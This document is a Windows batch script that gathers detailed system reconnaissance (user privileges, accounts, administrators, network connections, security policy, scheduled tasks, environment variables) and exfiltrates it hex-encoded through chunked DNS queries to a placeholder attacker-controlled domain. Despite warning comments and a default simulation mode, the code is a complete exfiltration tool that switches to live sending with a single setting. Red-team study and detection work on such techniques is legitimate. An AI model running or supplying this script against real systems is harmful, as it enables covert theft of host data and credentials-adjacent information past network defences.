@echo off
setlocal enabledelayedexpansion

REM ==========================================================================
REM System Information Gathering and DNS Exfiltration Script
REM Author: Jacques GariÃ©py
REM Date: %DATE%
REM ==========================================================================
REM
REM                           *** IMPORTANT WARNING ***
REM
REM This script performs data exfiltration techniques (DNS exfiltration).
REM This method is often used by malicious actors.
REM Ensure you have EXPLICIT AUTHORIZATION before running this script
REM and that you understand the implications.
REM Use is entirely at your own risk. You are responsible for:
REM   1. Obtaining necessary permissions.
REM   2. Complying with all applicable laws and policies.
REM   3. Configuring the receiving DNS server for the specified domain.
REM
REM ==========================================================================
REM
REM                      *** EDUCATIONAL NOTE ***
REM
REM The system information gathering and DNS exfiltration script previously
REM provided is intended for purely educational and demonstrative purposes.
REM It illustrates techniques that can be used both for legitimate security
REM audits (with explicit authorization) and for malicious purposes.
REM Using such techniques without authorization is illegal and unethical.
REM Running this script is at the user's own risk, and the user is
REM responsible for ensuring they have the necessary permissions and
REM comply with all applicable laws and policies. This script should
REM not be used in a production environment without a thorough risk
REM assessment and formal authorization.
REM
REM ==========================================================================
REM
REM This script must be run as an administrator!
REM (Right-click -> Run as administrator)
REM
REM ==========================================================================

REM -- Mode Configuration --
REM Set Mode to "/sim" for simulation or "/real" for actual exfiltration
set "Mode=/sim"  REM Change this to "/real" for actual exfiltration

REM -- Configuration --
set "OutputFile="%USERPROFILE%\Desktop\Security_Report_%COMPUTERNAME%_%date:~-4,4%%date:~-7,2%%date:~-10,2%.txt"
set "TempHex=temp.hex"
set "Domain=your_controlled_domain.com" REM <-- IMPORTANT: Replace with a domain you control!

REM -- Mode Validation --
if /i not "%Mode%"=="/sim" if /i not "%Mode%"=="/real" (
    echo Invalid Mode. Set Mode to "/sim" or "/real".
    exit /b
)

REM -- Step 1: Collect information into the output file --
echo Report generated by: %USERNAME% > %OutputFile%
echo Date and Time: %DATE% %TIME% >> %OutputFile%
echo Machine: %COMPUTERNAME% >> %OutputFile%
echo ================================================================ >> %OutputFile%
echo. >> %OutputFile%
echo [*** START OF INFORMATION GATHERING ***] >> %OutputFile%
echo. >> %OutputFile%

echo [--- Section 1: User and Machine Information ---] >> %OutputFile%
echo Current Directory: %CD% >> %OutputFile%
echo User Domain: %USERDOMAIN% >> %OutputFile%
echo Logon Server: %LOGONSERVER% >> %OutputFile%
(whoami /all) >> %OutputFile% 2>&1
echo. >> %OutputFile%

echo [--- Section 2: System Information (OS, Hotfixes) ---] >> %OutputFile%
(systeminfo) >> %OutputFile% 2>&1
echo. >> %OutputFile%
echo [Hotfixes (WMIC QFE)] >> %OutputFile%
(wmic qfe list full /format:list) >> %OutputFile% 2>&1
echo. >> %OutputFile%

echo [--- Section 3: Installed Software (via MSI - potentially incomplete list) ---] >> %OutputFile%
(wmic product get Name, Version, Vendor, InstallDate) >> %OutputFile% 2>&1
echo. >> %OutputFile%

echo [--- Section 4: Network Configuration ---] >> %OutputFile%
echo [IPCONFIG /ALL] >> %OutputFile%
(ipconfig /all) >> %OutputFile% 2>&1
echo. >> %OutputFile%
echo [NETSTAT -ANOB (Open ports and associated processes)] >> %OutputFile%
(netstat -anob) >> %OutputFile% 2>&1
echo. >> %OutputFile%
echo [Windows Firewall Status] >> %OutputFile%
(netsh advfirewall show allprofiles) >> %OutputFile% 2>&1
echo. >> %OutputFile%
echo [Network Shares (NET SHARE)] >> %OutputFile%
(net share) >> %OutputFile% 2>&1
echo. >> %OutputFile%

echo [--- Section 5: Processes and Services ---] >> %OutputFile%
echo [TASKLIST /SVC] >> %OutputFile%
(tasklist /svc) >> %OutputFile% 2>&1
echo. >> %OutputFile%
echo [Services (SC QUERY)] >> %OutputFile%
(sc query state= all) >> %OutputFile% 2>&1
echo. >> %OutputFile%

echo [--- Section 6: Accounts and Local Security ---] >> %OutputFile%
echo [Local User Accounts (NET USER)] >> %OutputFile%
(net user) >> %OutputFile% 2>&1
echo. >> %OutputFile%
echo [Local Administrators Group Members] >> %OutputFile%
(net localgroup administrators) >> %OutputFile% 2>&1
echo. >> %OutputFile%
echo [Password Policy (NET ACCOUNTS)] >> %OutputFile%
(net accounts) >> %OutputFile% 2>&1
echo. >> %OutputFile%
echo [Exporting Local Security Policy (to SecPol.cfg)] >> %OutputFile%
del SecPol.cfg > nul 2>&1
secedit /export /cfg SecPol.cfg /quiet
IF EXIST SecPol.cfg (type SecPol.cfg >> %OutputFile%) ELSE (echo Failed to export SecPol.cfg >> %OutputFile%)
echo. >> %OutputFile%

echo [--- Section 7: Scheduled Tasks ---] >> %OutputFile%
(schtasks /query /fo LIST /v) >> %OutputFile% 2>&1
echo. >> %OutputFile%

echo [--- Section 8: Environment Variables ---] >> %OutputFile%
(set) >> %OutputFile% 2>&1
echo. >> %OutputFile%

echo [--- Section 9: Hardware Devices ---] >> %OutputFile%
(wmic path Win32_PnPEntity get Caption, DeviceID) >> %OutputFile% 2>&1
echo. >> %OutputFile%

echo [--- Section 10: Group Policies ---] >> %OutputFile%
(gpresult /z) >> %OutputFile% 2>&1
echo. >> %OutputFile%

echo [--- Section 11: Installed Applications and Versions ---] >> %OutputFile%
(wmic product get Name,Version) >> %OutputFile% 2>&1
echo. >> %OutputFile%

echo [*** END OF INFORMATION GATHERING ***] >> %OutputFile%
echo. >> %OutputFile%
echo ================================================================ >> %OutputFile%

REM -- Step 2: Encode the file to hexadecimal --
certutil -encodehex %OutputFile% %TempHex% >nul 2>&1
IF NOT EXIST %TempHex% (
    echo Failed to encode report file to hex. Exiting.
    goto Cleanup
)

REM -- Step 3: Exfiltrate via DNS or simulate depending on Mode --
echo Starting DNS exfiltration process (%Mode% mode)...
set "Cumulative="
set "LineCount=0"
set "SegmentSize=62" REM Keep segments short to fit DNS label limits

for /f "usebackq tokens=1* delims=" %%L in ("%TempHex%") do (
    REM Extract hex bytes (usually columns 2-17 in certutil output)
    for /f "tokens=2-17" %%a in ("%%L") do (
        set "HexLine="
        REM Concatenate hex bytes for the current line
        for %%b in (%%a %%b %%c %%d %%e %%f %%g %%h %%i %%j %%k %%l %%m %%n %%o %%p) do (
            if "%%b" neq "" set "HexLine=!HexLine!%%~b"
        )
        REM Append line's hex to cumulative buffer
        set "Cumulative=!Cumulative!!HexLine!"
        set /a LineCount+=1

        REM Process buffer every ~10 lines or when cumulative buffer gets large
        if !LineCount! geq 10 (
            call :SendSegments
            set "Cumulative="
            set /a LineCount=0
        )
    )
)

REM Send any remaining data in the buffer
if defined Cumulative call :SendSegments

echo DNS exfiltration process finished.

:Cleanup
REM -- Cleanup --
echo Cleaning up temporary files...
if exist %TempHex% del %TempHex%
if exist SecPol.cfg del SecPol.cfg
echo.
echo Script finished. The full report was saved to:
echo %OutputFile%
echo.
pause
goto :eof

:SendSegments
set "Offset=0"
:SegmentLoop
if not defined Cumulative goto EndSegmentLoop
set "Segment=!Cumulative:~%Offset%,%SegmentSize%!"
if not defined Segment goto EndSegmentLoop
if "!Segment!"=="" goto EndSegmentLoop

if /i "%Mode%"=="/sim" (
    echo Simulating send: !Segment!.%Domain%
) else if /i "%Mode%"=="/real" (
    REM Actual DNS query - suppress output and errors
    nslookup !Segment!.%Domain% >nul 2>&1
    REM Optional: Add a small delay to avoid overwhelming DNS server/network
    REM timeout /t 1 /nobreak > nul
)
set /a Offset+=SegmentSize
goto SegmentLoop
:EndSegmentLoop
goto :eof
